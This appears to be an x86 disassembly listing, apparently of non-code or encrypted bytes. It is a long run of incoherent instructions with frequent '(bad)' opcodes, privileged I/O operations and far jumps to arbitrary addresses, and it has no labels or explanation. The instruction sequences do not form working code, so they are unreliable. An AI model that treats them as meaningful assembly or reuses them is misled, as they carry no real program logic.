  417c80:	cmp    BYTE PTR [edi+0x137e3f13],ch
  417c86:	cmp    al,0xe
  417c88:	stc    
  417c89:	adc    BYTE PTR ds:0xa90aba4,0x8a
  417c90:	cmp    dl,BYTE PTR [eax-0x51]
  417c93:	(bad)  
  417c94:	and    bh,al
  417c96:	hlt    
  417c97:	and    ecx,DWORD PTR [edi-0x45]
  417c9a:	adc    eax,0x8134f807
  417c9f:	xchg   edx,eax
  417ca0:	mov    dl,0x25
  417ca2:	(bad)  
  417ca3:	jne    0x417c72
  417ca5:	scas   eax,DWORD PTR es:[edi]
  417ca6:	call   0x9f2c:0xd2fad0aa
  417cad:	iret   
  417cae:	xchg   ebx,eax
  417caf:	pop    es
  417cb0:	cdq    
  417cb1:	scas   eax,DWORD PTR es:[edi]
  417cb2:	pop    ss
  417cb3:	push   eax
  417cb4:	stos   DWORD PTR es:[edi],eax
  417cb5:	ja     0x417cf6
  417cb7:	adc    eax,edi
  417cb9:	xlat   BYTE PTR ds:[ebx]
  417cba:	adc    bl,0xc2
  417cbd:	dec    ebp
  417cbe:	and    DWORD PTR [edx],esi
  417cc0:	je     0x417c8d
  417cc2:	cli    
  417cc3:	ret    
  417cc4:	mov    ah,0xaa
  417cc6:	icebp  
  417cc7:	jmp    0x15e25d33
  417ccc:	cmp    eax,0xb4917443
  417cd1:	cmp    BYTE PTR [eax-0x746b0c59],cl
  417cd7:	pop    esp
  417cd8:	push   ss
  417cd9:	or     BYTE PTR [esi],ah
  417cdb:	inc    esi
  417cdc:	ret    0x7e35
  417cdf:	sbb    DWORD PTR [edx+0x65],ecx
  417ce2:	push   esp
  417ce3:	pushf  
  417ce4:	inc    eax
  417ce5:	push   ss
  417ce6:	test   DWORD PTR [ecx],esp
  417ce8:	sub    edi,DWORD PTR [ebp+0x4ade3b88]
  417cee:	shr    BYTE PTR [esi],1
  417cf0:	daa    
  417cf1:	mov    ?,WORD PTR [eax+0x1f]
  417cf4:	or     BYTE PTR [ebp-0x53],al
  417cf7:	xor    bl,dh
  417cf9:	dec    ecx
  417cfa:	jne    0x417d3e
  417cfc:	lods   eax,DWORD PTR es:[esi]
  417cfe:	or     DWORD PTR [ebx-0x6ba447d1],ebx
  417d04:	push   esp
  417d05:	mov    cs,WORD PTR [edx+0x1fa4c816]
  417d0b:	adc    esp,esi
  417d0d:	cmc    
  417d0e:	outs   dx,DWORD PTR ds:[esi]
  417d0f:	fstp   QWORD PTR [ebx+0x66]
  417d12:	aaa    
  417d13:	cmp    edi,DWORD PTR [esi-0x315a996a]
  417d19:	inc    ebx
  417d1a:	xchg   DWORD PTR [esi+0xd2a61e7],edi
  417d20:	pop    ebx
  417d21:	imul   ecx,DWORD PTR [eax+eax*2-0x44],0x333dbc19
  417d29:	out    dx,al
  417d2a:	(bad)  
  417d2b:	aaa    
  417d2c:	in     eax,0xc3
  417d2e:	jp     0x417d51
  417d30:	cmp    esi,ebx
  417d32:	scas   al,BYTE PTR es:[edi]
  417d33:	push   ss
  417d34:	dec    eax
  417d35:	xchg   edx,eax
  417d36:	add    BYTE PTR [edx+0x7e],bh
  417d39:	(bad)  
  417d3a:	push   ds
  417d3b:	inc    ebx
  417d3c:	sub    eax,0x410cc201
  417d41:	pmulhuw mm4,QWORD PTR [bp+si-0x4384]
  417d47:	(bad)  
  417d48:	sbb    al,0xbc
  417d4a:	fistp  DWORD PTR [eax-0x3976295c]
  417d50:	push   edx
  417d51:	add    eax,0x5ed12fa9
  417d56:	mov    eax,ds:0xff8ae1e2
  417d5b:	popa   
  417d5c:	mov    eax,ds:0x6fc8be9f
  417d61:	jp     0x417d19
  417d63:	mov    dh,0xa4
  417d65:	shl    edi,cl
  417d67:	(bad)  
  417d68:	fsub   QWORD PTR [ebx-0x4066c02a]
  417d6e:	lahf   
  417d6f:	std    
  417d70:	mov    cl,0xf1
  417d72:	pushf  
  417d73:	jns    0x417d32
  417d75:	imul   edi,DWORD PTR [eax],0xffffff8c
  417d78:	(bad)  
  417d79:	test   eax,0x13a17316
  417d7e:	imul   eax,DWORD PTR [edi-0x360ae664],0x1a77cb7d
  417d88:	mov    DWORD PTR [ecx-0x32],esi
  417d8b:	dec    edi
  417d8c:	pop    eax
  417d8d:	clc    
  417d8e:	mov    ebp,es
  417d90:	fld    QWORD PTR [eax+0x48]
  417d93:	sub    al,0x35
  417d95:	shr    esp,1
  417d97:	jae    0x417dcf
  417d99:	fadd   QWORD PTR [ecx]
  417d9b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  417d9d:	mov    ecx,DWORD PTR ds:0xdd6f7c2a
  417da3:	jne    0x417d4d
  417da5:	sub    ah,BYTE PTR [ebx]
  417da7:	jmp    0xa6dd:0xf06977d7
  417dae:	adc    DWORD PTR [edi-0x78],esp
  417db1:	add    ebx,DWORD PTR [edx+eiz*4-0x7d]
  417db5:	sbb    dl,BYTE PTR ds:0x626a830b
  417dbb:	nop
  417dbc:	sub    cl,BYTE PTR [edi-0x504d0ca3]
  417dc2:	xchg   ebx,eax
  417dc3:	sbb    cl,BYTE PTR [esi+0x251e84cd]
  417dc9:	push   cs
  417dca:	out    dx,eax
  417dcb:	sub    ebp,ebx
  417dcd:	ror    BYTE PTR es:[esi-0x53dba64b],cl
  417dd4:	loopne 0x417dcf
  417dd6:	inc    edi
  417dd7:	jge    0x417d98
  417dd9:	clc    
  417dda:	mov    edx,0x57a28915
  417ddf:	mov    dl,0xe8
  417de1:	jecxz  0x417e2c
  417de3:	inc    edx
  417de4:	jns    0x417d8b
  417de6:	push   edx
  417de7:	jge    0x417e18
  417de9:	out    dx,eax
  417dea:	sbb    DWORD PTR [edx+0x34],edx
  417ded:	add    eax,0x70a4cc95
  417df2:	pop    ss
  417df3:	push   0xd584c7bf
  417df8:	aad    0x3
  417dfa:	sbb    ebx,ecx
  417dfc:	pop    ds
  417dfd:	jb     0x417dce
  417dff:	out    dx,eax
  417e00:	and    eax,0xc17d4ab4
  417e05:	cli    
  417e06:	jge    0x417e50
  417e08:	sbb    eax,0xa16c4ba9
  417e0d:	clc    
  417e0e:	aad    0x12
  417e10:	or     DWORD PTR [ebx+0xf],esi
  417e13:	(bad)  
  417e14:	call   0x7628434f
  417e19:	es inc esi
  417e1b:	adc    al,0x5d
  417e1d:	hlt    
  417e1e:	dec    eax
  417e1f:	int    0x87
  417e21:	pop    ebp
  417e22:	(bad)  
  417e23:	sbb    al,0x9c
  417e25:	inc    esp
  417e26:	retf   0x4a98
  417e29:	jnp    0x417ea4
  417e2b:	in     eax,dx
  417e2c:	ins    DWORD PTR es:[edi],dx
  417e2d:	pop    ebx
  417e2e:	fst    DWORD PTR [ecx+ecx*2+0x4f51feeb]
  417e35:	sbb    DWORD PTR [eax+0x60ab0b64],esi
  417e3b:	sahf   
  417e3c:	xlat   BYTE PTR ds:[ebx]
  417e3d:	mov    ebp,0xf97903c5
  417e42:	and    BYTE PTR [ecx-0x4ba77c85],0xb8
  417e49:	cmp    ah,dh
  417e4b:	fwait
  417e4c:	cs pop eax
  417e4e:	jecxz  0x417dfb
  417e50:	inc    eax
  417e51:	xchg   esi,eax
  417e52:	cmp    cl,BYTE PTR [edi]
  417e54:	push   0xf8ea468e
  417e59:	mov    gs,WORD PTR ds:0x1c0f6db9
  417e5f:	mov    ebx,0x565b5a38
  417e64:	mov    ds:0xe6cb252f,al
  417e69:	fld    DWORD PTR [ebp+0x1f9a8761]
  417e6f:	jne    0x417e6a
  417e71:	mov    ds:0xef7717d9,eax
  417e76:	cli    
  417e77:	es repz (bad) 
  417e7a:	ds daa 
  417e7c:	lock mov edi,0x39fd37ed
  417e82:	jecxz  0x417ee1
  417e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e85:	jge    0x417e89
  417e87:	sub    al,0x97
  417e89:	repnz rcr DWORD PTR [esi+0x6d2a7d69],0x95
  417e91:	retf   
  417e92:	and    ebx,DWORD PTR [edx]
  417e94:	or     BYTE PTR [esi+0x47],bl
  417e97:	sbb    bh,BYTE PTR [ecx-0x60]
  417e9a:	sub    BYTE PTR [esi-0x5e],al
  417e9d:	cmp    DWORD PTR [edx],edi
  417e9f:	ror    DWORD PTR [edi+ecx*2],1
  417ea2:	inc    ebx
  417ea3:	push   ebx
  417ea4:	pop    es
  417ea5:	mov    ah,0x64
  417ea7:	(bad)  
  417ea8:	sahf   
  417ea9:	jns    0x417f1d
  417eab:	pop    ss
  417eac:	adc    DWORD PTR [ecx],edx
  417eae:	cmp    edx,DWORD PTR [esp+ebp*8-0x331c6b4d]
  417eb5:	std    
  417eb6:	ret    0x1c1f
  417eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eba:	and    BYTE PTR [ebx+0x5c8ca0bf],bh
  417ec0:	fstp   TBYTE PTR [ebx+0x29]
  417ec3:	dec    esi
  417ec4:	stc    
  417ec5:	mov    edi,0x102f13c9
  417eca:	pop    edx
  417ecb:	shl    al,1
  417ecd:	pop    ecx
  417ece:	and    DWORD PTR [ecx+0x31512ed0],esi
  417ed4:	clc    
  417ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ed6:	das    
  417ed7:	xchg   ecx,eax
  417ed8:	into   
  417ed9:	mov    ?,ebp
  417edb:	jnp    0x417eb9
  417edd:	retf   
  417ede:	sub    BYTE PTR [ecx-0x1036bc47],bh
  417ee4:	dec    esp
  417ee5:	sub    al,0xde
  417ee7:	adc    al,0x46
  417ee9:	xor    ebp,DWORD PTR [ebp-0x24130662]
  417eef:	adc    ah,BYTE PTR [ecx]
  417ef1:	push   ss
  417ef2:	call   0x9aa32993
  417ef7:	outs   dx,BYTE PTR ds:[esi]
  417ef8:	cmp    al,0xcf
  417efa:	retf   
  417efb:	inc    ebx
  417efc:	test   cl,cl
  417efe:	jbe    0x417e84
  417f00:	cwde   
  417f01:	mov    bl,0x15
  417f03:	popf   
  417f04:	fsin   
  417f06:	(bad)  [edi-0x27f914b8]
  417f0c:	(bad)  
  417f0d:	jmp    0xc684:0xf722ad1
  417f14:	loop   0x417f66
  417f16:	daa    
  417f17:	xor    DWORD PTR ds:0x2734c74b,eax
  417f1d:	jl     0x417eaf
  417f1f:	add    esp,ebx
  417f21:	mov    ds:0xe9760f44,eax
  417f26:	mov    ch,0xfc
  417f28:	mov    ds:0x7b201ca4,al
  417f2d:	mov    bl,0x5b
  417f2f:	push   ds
  417f30:	push   esp
  417f31:	fucomp st(3)
  417f33:	push   es
  417f34:	ds pop edx
  417f36:	outs   dx,DWORD PTR ds:[esi]
  417f37:	sbb    al,BYTE PTR [esi-0x3b]
  417f3a:	stos   DWORD PTR es:[edi],eax
  417f3b:	push   edx
  417f3c:	sbb    al,0xc4
  417f3e:	mov    bl,0x1d
  417f40:	gs push ebp
  417f42:	inc    eax
  417f43:	xchg   ebx,eax
  417f44:	or     BYTE PTR ds:0x70bbc8ea,ch
  417f4a:	mov    bh,0x2f
  417f4c:	lahf   
  417f4d:	inc    esp
  417f4e:	rol    BYTE PTR [eax],cl
  417f50:	cmp    eax,0x7f6b9c2d
  417f55:	push   es
  417f56:	xchg   edi,eax
  417f57:	test   ebp,esp
  417f59:	sbb    ah,BYTE PTR [edi]
  417f5b:	lds    edx,FWORD PTR [ebx+0x7aa51495]
  417f61:	icebp  
  417f62:	mov    edi,0x5351548a
  417f67:	cmp    bh,0x99
  417f6a:	pop    edx
  417f6b:	inc    esi
  417f6c:	test   al,0x58
  417f6e:	retf   0xf627
  417f71:	adc    DWORD PTR [eax+eiz*1-0x51],ebx
  417f75:	int3   
  417f76:	loopne 0x417fc2
  417f78:	aam    0xbe
  417f7a:	in     eax,0x2e
  417f7c:	ret    0x29e
  417f7f:	out    0x96,al
  417f81:	jl     0x417f1d
  417f83:	or     bh,bh
  417f85:	(bad)  
  417f86:	ds leave 
  417f88:	fsubr  st,st(0)
  417f8a:	xchg   esi,eax
  417f8b:	push   eax
  417f8c:	loop   0x417f21
  417f8e:	nop
  417f8f:	aas    
  417f90:	test   bl,ch
  417f92:	scas   eax,DWORD PTR es:[edi]
  417f93:	repnz inc ebp
  417f95:	fdiv   DWORD PTR [eax]
  417f97:	ret    
  417f98:	pop    ecx
  417f99:	adc    DWORD PTR [edx+0x3e337030],0xffffff8e
  417fa0:	inc    ebx
  417fa1:	popf   
  417fa2:	fsubr  DWORD PTR ds:0x4a18419e
  417fa8:	and    esp,DWORD PTR [ecx]
  417faa:	pop    ecx
  417fab:	dec    edx
  417fac:	jmp    0x93ae11c3
  417fb1:	mov    bh,0x7e
  417fb3:	fmul   QWORD PTR [esi]
  417fb6:	cwde   
  417fb7:	and    bl,BYTE PTR [edi+ecx*2+0x289786dd]
  417fbe:	mov    ebx,edx
  417fc0:	and    BYTE PTR [esi],0xc5
  417fc3:	test   DWORD PTR [ebx],esi
  417fc5:	mov    eax,0x31908b55
  417fca:	sar    DWORD PTR [edi-0x48d658d7],cl
  417fd0:	pop    ecx
  417fd1:	test   esi,esp
  417fd3:	xor    eax,0xca3254be
  417fd8:	mov    ecx,0x890a3a6c
  417fdd:	stc    
  417fde:	jae    0x41800e
  417fe0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  417fe2:	sti    
  417fe3:	sahf   
  417fe4:	dec    ecx
  417fe5:	(bad)  
  417fe6:	mov    cs,WORD PTR [esi-0x2d]
  417fe9:	jg     0x417f75
  417feb:	inc    ebx
  417fec:	in     eax,dx
  417fed:	arpl   bx,bx
  417fef:	mov    esp,0xadae1f35
  417ff4:	inc    ebx
  417ff5:	dec    ebp
  417ff6:	jne    0x417fab
  417ff8:	out    0x12,al
  417ffa:	xor    BYTE PTR [esi],dl
  417ffc:	jge    0x417f85
  417ffe:	lahf   
  417fff:	cmp    BYTE PTR [ebp-0x12],bl
  418002:	gs push 0xe93ccafc
  418008:	ret    0xa49b
  41800b:	mov    al,ds:0xe5b03ac2
  418010:	cmp    al,0x45
  418012:	add    ebp,DWORD PTR [esi+ebx*4]
  418015:	iret   
  418016:	pop    eax
  418017:	ins    BYTE PTR es:[edi],dx
  418018:	mov    bh,0x4e
  41801a:	jno    0x41804f
  41801c:	jle    0x417fd8
  41801e:	fwait
  41801f:	ret    
  418020:	cmp    ch,BYTE PTR [esi]
  418022:	and    ah,BYTE PTR [ebp+0x67]
  418025:	inc    DWORD PTR [ecx-0x427150cd]
  41802b:	adc    al,0xb7
  41802d:	dec    edi
  41802e:	icebp  
  41802f:	hlt    
  418030:	mov    esp,0xf79e01a0
  418035:	mov    eax,DWORD PTR [eax]
  418037:	push   ebx
  418038:	scas   eax,DWORD PTR es:[edi]
  418039:	xchg   ecx,eax
  41803a:	push   esp
  41803b:	sbb    ah,BYTE PTR [edi+0x24]
  41803e:	int3   
  41803f:	mov    edx,0x65e01bcf
  418044:	fadd   QWORD PTR [eax-0x6e]
  418047:	out    0x14,eax
  418049:	out    dx,al
  41804a:	xchg   ecx,eax
  41804b:	push   edx
  41804c:	stc    
  41804d:	fild   QWORD PTR [edi]
  41804f:	mov    eax,ds:0x603b4a79
  418054:	mov    ecx,DWORD PTR [eax]
  418056:	pop    edi
  418057:	push   cs
  418058:	(bad)  
  418059:	mov    bh,0x35
  41805b:	rol    BYTE PTR [esi+0x7c2be71c],cl
  418061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418062:	(bad)  
  418063:	stc    
  418064:	pop    esi
  418065:	shr    ch,cl
  418067:	fld    st(4)
  418069:	(bad)  
  41806a:	jns    0x41800e
  41806c:	mov    eax,ds:0x1d18027c
  418071:	fcmovne st,st(1)
  418073:	inc    eax
  418074:	mov    dh,0x95
  418076:	outs   dx,DWORD PTR ds:[esi]
  418077:	pop    ss
  418078:	sub    al,0xa7
  41807a:	sub    BYTE PTR [esi],al
  41807c:	daa    
  41807d:	sub    al,0x96
  41807f:	test   DWORD PTR [esi-0x5e1911ae],eax
  418085:	mov    cl,0x18
  418087:	repnz xor edi,DWORD PTR [esi+edx*4-0x5d]
  41808c:	cmp    BYTE PTR [ebx-0x24],dl
  41808f:	call   0x1e73:0x3b92a11c
  418096:	lea    edi,[esp+eax*4+0x12]
  41809a:	scas   al,BYTE PTR es:[edi]
  41809b:	sti    
  41809c:	inc    edx
  41809d:	ins    BYTE PTR es:[edi],dx
  41809e:	sbb    DWORD PTR [ecx+edx*4],ebx
  4180a1:	dec    edx
  4180a2:	mov    ds:0x5306729f,al
  4180a7:	jge    0x41802f
  4180a9:	dec    eax
  4180aa:	adc    BYTE PTR [esi+edx*8-0x76],dh
  4180ae:	(bad)  
  4180af:	mov    WORD PTR [si],?
  4180b2:	js     0x418034
  4180b4:	push   ecx
  4180b5:	mov    bl,0x9
  4180b7:	or     al,0xef
  4180b9:	loopne 0x41803e
  4180bb:	pop    esi
  4180bc:	jbe    0x41813c
  4180be:	stos   DWORD PTR es:[edi],eax
  4180bf:	iret   
  4180c0:	and    eax,0x5ff9c0bd
  4180c5:	pop    edi
  4180c6:	fwait
  4180c7:	imul   BYTE PTR [ecx+0x0]
  4180ca:	aad    0xe7
  4180cc:	imul   edx
  4180ce:	adc    BYTE PTR [esi],dl
  4180d0:	and    ah,cl
  4180d2:	and    esp,ebp
  4180d4:	cmp    DWORD PTR [esi],eax
  4180d6:	scas   eax,DWORD PTR es:[edi]
  4180d7:	mov    edi,0xb447cb58
  4180dc:	mov    bl,0x92
  4180de:	push   esi
  4180df:	aaa    
  4180e0:	xor    esi,ecx
  4180e2:	fstp   QWORD PTR [ebp-0x396e3dcd]
  4180e8:	pop    ds
  4180e9:	and    cl,BYTE PTR [ecx]
  4180eb:	rcr    BYTE PTR ds:0x8d1a32f1,cl
  4180f1:	xchg   edx,eax
  4180f2:	ror    DWORD PTR [ecx-0x30],1
  4180f5:	(bad)  
  4180f7:	push   ebp
  4180f8:	push   ecx
  4180f9:	mov    WORD PTR [esi+0x59],gs
  4180fc:	in     eax,dx
  4180fd:	xchg   edi,eax
  4180fe:	(bad)  
  4180ff:	fisubr WORD PTR [edi]
  418101:	in     al,0x3
  418103:	fistp  DWORD PTR [edx+ebp*8-0x4a605175]
  41810a:	push   cs
  41810b:	imul   ecx,DWORD PTR [ecx+esi*2+0x5f3bda4],0x340cf94c
  418116:	or     cl,BYTE PTR [ebp-0x66]
  418119:	lods   al,BYTE PTR ds:[esi]
  41811a:	xchg   BYTE PTR [ebx],dl
  41811c:	ror    BYTE PTR [edi-0x5749b264],0xe0
  418123:	mov    esi,0x7c49b758
  418128:	mov    ch,0x43
  41812a:	jg     0x4180ae
  41812c:	add    DWORD PTR [ebx],0x66b5caf5
  418132:	daa    
  418133:	mov    BYTE PTR [ebx+0x79ce6830],al
  418139:	pop    eax
  41813a:	dec    DWORD PTR [ebx+0x64]
  41813d:	mov    eax,0x4c30644f
  418142:	in     eax,dx
  418143:	inc    edi
  418144:	xor    al,0x5d
  418146:	aad    0x64
  418148:	sbb    edi,DWORD PTR [edx+ecx*8]
  41814b:	pop    edx
  41814c:	sbb    BYTE PTR [edi-0x30f26d96],cl
  418152:	adc    esp,DWORD PTR [ebp-0x7a]
  418155:	sub    ch,BYTE PTR [edi]
  418157:	pop    ecx
  418158:	push   ebp
  418159:	push   eax
  41815a:	cmp    ch,BYTE PTR ds:0xbbcb1b25
  418160:	mov    al,dl
  418162:	ret    0x4fa0
  418165:	imul   edx,DWORD PTR ds:0x6c2e3778,0xd1b73ae2
  41816f:	and    al,0x80
  418171:	push   edx
  418172:	fisttp QWORD PTR [esi+0x7a]
  418175:	push   eax
  418176:	jl     0x41811a
  418178:	sub    al,0xb5
  41817a:	setnp  BYTE PTR ds:0xe49f875d
  418181:	sub    eax,DWORD PTR [esp+eax*8]
  418184:	adc    al,0x9a
  418186:	lods   eax,DWORD PTR ds:[esi]
  418187:	call   0x5f2fbc2d
  41818c:	scas   al,BYTE PTR es:[edi]
  41818d:	jmp    DWORD PTR [edi-0x5eed747c]
  418193:	cmp    BYTE PTR [edx+0x4220f098],bl
  418199:	stos   DWORD PTR es:[edi],eax
  41819a:	cmp    al,0xa7
  41819c:	jl     0x41812a
  41819e:	push   esp
  41819f:	lods   al,BYTE PTR ds:[esi]
  4181a0:	adc    al,0x38
  4181a2:	(bad)  
  4181a3:	enter  0xa608,0x67
  4181a7:	sahf   
  4181a8:	retf   
  4181a9:	adc    DWORD PTR [ebx-0x7acf2e53],eax
  4181af:	fild   DWORD PTR [eax+ebx*1+0xafba2ec]
  4181b6:	jae    0x4181fd
  4181b8:	test   eax,esi
  4181ba:	or     BYTE PTR [edx+0x25864360],ah
  4181c0:	jo     0x4181fd
  4181c2:	inc    esi
  4181c3:	adc    edx,esp
  4181c5:	xchg   edi,eax
  4181c6:	jp     0x418244
  4181c8:	dec    edi
  4181c9:	jmp    0x8f4d8699
  4181ce:	stos   DWORD PTR es:[edi],eax
  4181cf:	and    edx,DWORD PTR [ebp+ebp*4+0x35]
  4181d3:	xchg   esp,eax
  4181d4:	retf   
  4181d5:	(bad)  
  4181d6:	ret    
  4181d7:	or     dl,BYTE PTR [ecx+0x70]
  4181da:	cdq    
  4181db:	enterw 0x5924,0x85
  4181e0:	dec    esp
  4181e1:	scas   eax,DWORD PTR es:[edi]
  4181e2:	retf   
  4181e3:	xor    edx,DWORD PTR [ebp+0x4548a5e7]
  4181e9:	xchg   esi,eax
  4181ea:	aaa    
  4181eb:	jae    0x418255
  4181ed:	sbb    eax,0xd6265631
  4181f2:	xchg   esp,eax
  4181f3:	addr16 xor al,0x4
  4181f6:	sub    ecx,DWORD PTR [edx]
  4181f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181f9:	jmp    DWORD PTR [esi+0x67fa08ea]
  4181ff:	add    eax,DWORD PTR [edi+0x68]
  418202:	push   ecx
  418203:	cmp    ebx,DWORD PTR [esi-0x3d1bb529]
  418209:	mov    ds:0x77582028,eax
  41820e:	lds    esi,FWORD PTR [ebp+edi*4+0x4aa1e12a]
  418215:	sub    dl,dh
  418217:	adc    al,0x63
  418219:	mov    esp,0xe06e794c
  41821e:	in     eax,dx
  41821f:	das    
  418220:	mov    dh,bh
  418222:	adc    ecx,0x7f
  418225:	and    DWORD PTR [esi-0x4b1a635d],0xcc78977f
  41822f:	add    DWORD PTR [ebp+0x6a],esp
  418232:	mov    dl,0x2b
  418234:	xor    dl,BYTE PTR [ebp+0x76ddb3ae]
  41823a:	test   BYTE PTR [eax+0x47510579],ah
  418240:	mov    ch,0x31
  418242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418243:	jecxz  0x41823f
  418245:	cmp    edi,DWORD PTR [eax-0x7c]
  418248:	mov    dl,0x97
  41824a:	loop   0x41820a
  41824c:	(bad)  
  41824d:	fistp  WORD PTR [ebx-0xbfa9e86]
  418253:	mov    cl,0xb0
  418255:	daa    
  418256:	sub    DWORD PTR [ecx],esp
  418258:	imul   ecx,DWORD PTR [ebx],0x5a
  41825b:	fdiv   st,st(6)
  41825d:	setg   BYTE PTR [edi+0x3ccc8900]
  418264:	(bad)  
  418265:	hlt    
  418266:	mov    eax,0xa23bf577
  41826b:	mov    ecx,0x8d4d4762
  418270:	fisub  WORD PTR [ebx+edi*1+0x45]
  418274:	fbld   TBYTE PTR [ecx+0x60e7f864]
  41827a:	lock push 0x20c801
  418280:	add    al,0x8f
  418282:	mov    edx,0x833cc9a
  418287:	jae    0x41823f
  418289:	sar    BYTE PTR ds:0x1d832635,0xbb
  418290:	test   DWORD PTR [edx-0x30],eax
  418293:	(bad)  
  418294:	aam    0x3
  418296:	inc    ebp
  418297:	push   esp
  418298:	mov    DWORD PTR [edi+0x39074c97],edi
  41829e:	test   DWORD PTR [esp+edx*1-0x3a],eax
  4182a2:	loop   0x4182ea
  4182a4:	aam    0x65
  4182a6:	cmp    ebp,DWORD PTR [esi+0x6719a36b]
  4182ac:	rcr    al,0xa8
  4182af:	adc    BYTE PTR [edi+eax*1+0x4bfba9e4],0xa5
  4182b7:	fbld   TBYTE PTR [ebx-0xfd2f3dc]
  4182bd:	pop    ds
  4182be:	mov    eax,ds:0xa0b6ed64
  4182c3:	cmp    eax,0x6d5121
  4182c8:	pop    ecx
  4182c9:	xor    al,0x9
  4182cb:	mov    eax,0xaaf4df7d
  4182d0:	sbb    edx,edi
  4182d2:	or     DWORD PTR [si],eax
  4182d5:	(bad)  
  4182d6:	jg     0x418329
  4182d8:	shl    DWORD PTR [ecx-0xe],cl
  4182db:	sti    
  4182dc:	fild   DWORD PTR [edi]
  4182de:	lds    esp,FWORD PTR ds:0xca1d6e31
  4182e4:	scas   eax,DWORD PTR es:[edi]
  4182e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182e6:	push   0x25
  4182e8:	ror    ebx,0x98
  4182eb:	mov    ch,0xa2
  4182ed:	jnp    0x4182e1
  4182ef:	in     eax,0xdb
  4182f1:	jo     0x418343
  4182f3:	in     eax,0xed
  4182f5:	push   ecx
  4182f6:	push   edx
  4182f7:	sub    eax,0x79b6c276
  4182fc:	jno    0x41832c
  4182fe:	jmp    0xe9e7:0x4c610b5f
  418305:	xchg   esp,eax
  418306:	push   ecx
  418307:	scas   al,BYTE PTR es:[edi]
  418308:	mov    ah,0x21
  41830a:	add    al,0xd9
  41830c:	(bad)  
  41830e:	mov    al,ds:0x9e074762
  418313:	dec    ebx
  418314:	inc    eax
  418315:	pop    edx
  418316:	sbb    DWORD PTR [ecx-0x156e63b9],0x1a6aa030
  418320:	push   ebx
  418321:	inc    ebx
  418322:	test   BYTE PTR [eax],bh
  418324:	mov    al,ds:0x370a83ea
  418329:	sbb    esp,DWORD PTR [ebx+esi*8-0xf4c5749]
  418330:	cdq    
  418331:	inc    ebx
  418332:	retf   
  418333:	fadd   DWORD PTR [ebp-0x54e6ce4f]
  418339:	in     al,dx
  41833a:	nop
  41833b:	pop    esp
  41833c:	arpl   WORD PTR [ebp+eiz*8+0x411c263f],cx
  418343:	pusha  
  418344:	jecxz  0x4183b7
  418346:	lods   eax,DWORD PTR ds:[esi]
  418347:	outs   dx,BYTE PTR gs:[esi]
  418349:	int3   
  41834a:	scas   eax,DWORD PTR es:[edi]
  41834b:	and    eax,DWORD PTR [edi+0x5c]
  41834e:	xor    ah,BYTE PTR [ebx]
  418350:	pop    edx
  418351:	sub    al,0xbb
  418353:	(bad)  
  418354:	xor    al,0xc9
  418356:	test   DWORD PTR [ebx-0x3],edx
  418359:	repz aam 0xfd
  41835c:	adc    DWORD PTR [esi-0x40],0x73
  418360:	out    0x38,eax
  418362:	or     ecx,edi
  418364:	xchg   ebp,eax
  418365:	les    esi,FWORD PTR [edx-0x78]
  418368:	sti    
  418369:	imul   esi,DWORD PTR [eax],0x5842a9c4
  41836f:	cmp    eax,ebx
  418371:	dec    ebx
  418372:	xor    eax,DWORD PTR [ebx-0x32ab0a9c]
  418378:	xchg   esi,eax
  418379:	mov    dl,0x47
  41837b:	and    cl,ch
  41837d:	mov    DWORD PTR [ebx],esp
  41837f:	push   edx
  418380:	mov    ebp,ebx
  418382:	jae    0x418319
  418384:	sti    
  418385:	sub    eax,0xde8e92dd
  41838a:	xchg   DWORD PTR [edi],edx
  41838c:	inc    ecx
  41838d:	repnz adc al,0xec
  418390:	daa    
  418391:	loopne 0x4183da
  418393:	cmp    eax,DWORD PTR [esi+0x45]
  418396:	stc    
  418397:	ins    DWORD PTR es:[edi],dx
  418398:	ffreep st(5)
  41839a:	test   DWORD PTR ds:0xaf6c5c0b,eax
  4183a0:	loop   0x41839c
  4183a2:	jb     0x418373
  4183a4:	inc    eax
  4183a5:	adc    BYTE PTR [ebp+0x70],dh
  4183a8:	jmp    0x7ad4e209
  4183ad:	jne    0x4183df
  4183af:	push   ebx
  4183b0:	push   DWORD PTR [esi+0x59db5281]
  4183b6:	jne    0x418431
  4183b8:	inc    ebp
  4183b9:	fcomp  QWORD PTR [eax]
  4183bb:	push   es
  4183bc:	mov    ds:0x54f7addf,al
  4183c1:	cs jg  0x418388
  4183c4:	jae    0x41843a
  4183c6:	das    
  4183c7:	adc    al,0xd5
  4183c9:	and    eax,DWORD PTR ds:[ebp+0x4a8b16be]
  4183d0:	jmp    0x418428
  4183d2:	xchg   ecx,eax
  4183d3:	retf   0x9cf8
  4183d6:	cmp    ah,dl
  4183d8:	jae    0x418422
  4183da:	(bad)  
  4183db:	jno    0x4183ab
  4183dd:	jne    0x41842b
  4183df:	xchg   ebp,eax
  4183e0:	mov    edx,0xb9e023f4
  4183e5:	dec    ebx
  4183e6:	inc    esi
  4183e7:	mov    ch,0x5d
  4183e9:	adc    BYTE PTR ds:0x58b8eed6,dl
  4183ef:	mov    ch,0xf6
  4183f1:	mov    edx,0xd63b3510
  4183f6:	les    eax,FWORD PTR [edx+0x75]
  4183f9:	push   ss
  4183fa:	addr16 xor eax,0x7f8b8e1b
  418400:	and    eax,0xc1df0dff
  418405:	cmp    al,0xcb
  418407:	dec    edx
  418408:	ret    0x1261
  41840b:	dec    ebp
  41840c:	push   edi
  41840d:	ror    esp,1
  41840f:	daa    
  418410:	adc    eax,0x9ea5b253
  418415:	ret    
  418416:	xchg   ecx,eax
  418417:	rcl    DWORD PTR [ebx-0xf],0xf9
  41841b:	pop    ds
  41841c:	in     eax,dx
  41841d:	lahf   
  41841e:	inc    ebx
  41841f:	clc    
  418420:	shr    BYTE PTR [esi],0x4c
  418423:	mov    ebp,0x6449d3e2
  418428:	inc    esp
  418429:	mov    cl,0x5d
  41842b:	rcl    BYTE PTR [eax+0x63],cl
  41842e:	push   es
  41842f:	neg    BYTE PTR [ebx-0x53]
  418432:	push   esi
  418433:	cs loope 0x4183d9
  418436:	pop    esp
  418437:	ret    0x211
  41843a:	addr16 mov eax,ds:0x7041
